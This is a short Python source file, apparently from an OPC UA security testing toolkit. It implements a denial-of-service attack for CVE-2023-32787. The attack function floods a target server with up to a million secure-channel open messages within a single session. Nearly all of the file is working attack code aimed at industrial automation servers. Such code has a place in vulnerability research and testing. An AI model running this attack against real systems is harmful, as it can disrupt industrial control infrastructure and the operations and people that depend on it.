# Unlimited Channels in a Single Session Attack
#   Open many secure channels on the same OPC UA session
#
# CVEs:
#   - CVE-2023-32787: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2023-32787.pdf
#

from protocol import *


def attack(server_details, amount_of_sec_channels=1000000, reset_sequence=True):
    program_type, ip_addr, port, query_string = server_details
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.send_hello_msg(count=1, should_recv=True)
    opcua.send_open_msg(reset_sequence=reset_sequence)
    for _ in range(amount_of_sec_channels):
        opcua.send_open_msg()